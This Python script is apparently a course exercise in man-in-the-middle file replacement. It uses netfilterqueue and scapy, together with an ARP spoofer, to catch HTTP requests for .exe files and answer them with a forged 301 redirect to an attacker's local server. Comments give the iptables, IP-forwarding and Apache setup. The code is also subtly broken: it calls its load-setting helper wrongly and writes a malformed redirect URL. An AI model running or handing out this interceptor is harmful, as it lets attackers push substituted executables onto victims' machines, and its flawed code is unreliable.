#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0 # CREATE THE NFQUEUE TO TRACK PACKAGES RECEIVED FROM OTHER PCS
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 # CREATE THE NFQUEUE TO TRACK PACKAGES YOU'RE SENDING OUT LOCALLY
# iptables -I INPUT -j NFQUEUE --queue-num 0 # CREATE THE NFQUEUE TO TRACK PACKAGES YOU'RE RECEIVING LOCALLY
# iptables --flush # FLUSH THE IPTABLE WHEN YOU'RE DONE

# Your local server is stored under ~/var/www/html
# You can run it with service apache2 start

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    # Always delete len and chksum when altering packages
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

# sport of the TCP layer is HTTP = it's a response. If it's dport, it's a request.
# the Raw (load) packet is the important part.
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 8080:
            # Second if statement is required to not cause a loop
            if b".exe" in scapy_packet[scapy.Raw].load and b"192.168.18.139" not in scapy_packet[scapy.Raw].load:

                print("[+] .exe Request...")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 8080:
            if scapy_packet[scapy.TCP].seq in ack_list:

                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")
                print(scapy_packet.show())
                # Normally you'd get HTTP 200 (OK) but we want to reroute the package instead.
                # Your local server is in var/www/html and you need to start it with service apache2 start
                # Then, iptables --flush. Then, iptables -I FORWARD -j NFQUEUE --queue-num 0, then run arp_spoofer
                # If packets, not flowing, then echo 1 > /proc/sys/net/ipv4/ip_forward
                packet.set_load(bytes(scapy_packet), "HTTP/1.1 301 Moved Permanently\nLocation: http:192.168.18.139/whatever...\n\n")

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

